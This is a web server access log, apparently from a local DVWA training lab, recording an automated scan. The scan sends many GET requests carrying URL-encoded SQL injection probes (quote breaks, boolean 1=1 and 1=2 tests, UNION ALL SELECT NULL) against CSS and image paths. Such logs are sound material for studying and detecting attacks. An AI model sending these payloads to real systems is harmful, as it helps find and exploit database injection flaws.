172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/css/main.css HTTP/1.1" 200 4278 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=%27 HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=query%27 HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=%22 HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=query%22 HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=%3B HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=query%3B HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=%29 HTTP/1.1" 301 554 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=query%29 HTTP/1.1" 301 564 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=query+AND+1%3D1+--+ HTTP/1.1" 301 586 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:26 +0000] "GET /dvwa/images?query=query%22+AND+%221%22%3D%221%22+--+ HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query+AND+1%3D1 HTTP/1.1" 301 578 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query%27+AND+%271%27%3D%271 HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query%22+AND+%221%22%3D%221 HTTP/1.1" 301 602 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 610 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 616 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 301 622 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=%27 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%22 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=%3B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%3B HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=%29 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%29 HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query+AND+1%3D1+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/login_logo.png HTTP/1.1" 200 9319 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /docs/DVWA_v1.3.pdf?query=%22 HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=%27 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%22 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=%3B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%3B HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=%29 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%29 HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query+AND+1%3D1+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27+AND+%271%27%3D%272%27+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27+OR+%271%27%3D%271%27+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%22+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5294 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png?query=query%27%29+UNION+ALL+select+NULL+--+ HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/logo.png HTTP/1.1" 200 5275 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:27 +0000] "GET /dvwa/images/RandomStorm.png?query=%27 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%22 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=%3B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%3B HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=%29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%29 HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query+AND+1%3D1+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query+AND+1%3D2+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query+OR+1%3D1+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:28 +0000] "GET /dvwa/images/RandomStorm.png?query=query%27+AND+%271%27%3D%271%27+--+ HTTP/1.1" 200 4746 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
